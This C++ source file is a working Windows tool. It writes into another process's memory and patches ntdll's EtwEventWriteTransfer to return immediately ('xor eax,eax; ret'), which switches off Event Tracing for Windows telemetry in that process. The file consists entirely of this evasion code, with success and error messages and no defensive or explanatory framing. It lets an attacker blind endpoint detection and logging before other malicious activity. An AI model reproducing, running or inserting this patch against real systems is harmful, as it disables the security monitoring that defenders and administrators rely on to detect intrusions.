#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <TlHelp32.h>

uintptr_t get_target_dll_address(DWORD pid, const std::wstring& dll);
uintptr_t get_api_offset(const std::string& dll_name, const std::string& api);

int main() {
    DWORD pid;
    std::cout << "Input target PID: ";
    if (!(std::cin >> pid)) return 1;

    uintptr_t target_ntdll_address = get_target_dll_address(pid, L"ntdll.dll");
    uintptr_t offset = get_api_offset("ntdll.dll", "EtwEventWriteTransfer");
    if (target_ntdll_address == 0 || offset == 0) {
        std::cerr << "[-] Failed to find target addresses." << std::endl;
        return 1;
    }

    uintptr_t target_api_address = target_ntdll_address + offset;
    std::cout << "[+] EtwEventWriteTransfer address: " << reinterpret_cast<void*>(target_api_address) << std::endl;
    
    // xor eax,eax
    // ret
    std::vector<unsigned char> patch = { 0x31, 0xC0, 0xC3 };
    HANDLE handle_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (handle_process) {
        DWORD old_protect;
        SIZE_T written;

        if (VirtualProtectEx(handle_process, reinterpret_cast<LPVOID>(target_api_address), patch.size(), PAGE_EXECUTE_READWRITE, &old_protect)) {
            if (WriteProcessMemory(handle_process, reinterpret_cast<LPVOID>(target_api_address), patch.data(), patch.size(), &written)) {
                std::cout << "[!] ETW patched successfully." << std::endl;
            } else {
                std::cerr << "[-] WriteProcessMemory failed. Error: " << GetLastError() << std::endl;
            }

            VirtualProtectEx(handle_process, reinterpret_cast<LPVOID>(target_api_address), patch.size(), old_protect, &old_protect);
        } else {
            std::cerr << "[-] VirtualProtectEx failed. Error: " << GetLastError() << std::endl;
        }
        CloseHandle(handle_process);
    } else {
        std::cerr << "[-] OpenProcess failed. Error: " << GetLastError() << std::endl;
    }

    return 0;
}

uintptr_t get_target_dll_address(DWORD pid, const std::wstring& dll) {
    HANDLE handle_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (handle_snapshot == INVALID_HANDLE_VALUE) return 0;

    MODULEENTRY32W me32 = { sizeof(MODULEENTRY32W) };
    uintptr_t base_address = 0;

    if (Module32FirstW(handle_snapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, dll.c_str()) == 0) {
                base_address = reinterpret_cast<uintptr_t>(me32.modBaseAddr);
                break;
            }
        } while (Module32NextW(handle_snapshot, &me32));
    }
    CloseHandle(handle_snapshot);
    return base_address;
}

uintptr_t get_api_offset(const std::string& dll, const std::string& api) {
    HMODULE handle_dll = LoadLibraryA(dll.c_str());
    if (!handle_dll) return 0;
    void* api_address = reinterpret_cast<void*>(GetProcAddress(handle_dll, api.c_str()));
    uintptr_t offset = reinterpret_cast<uintptr_t>(api_address) - reinterpret_cast<uintptr_t>(handle_dll);
    FreeLibrary(handle_dll);
    return offset;
}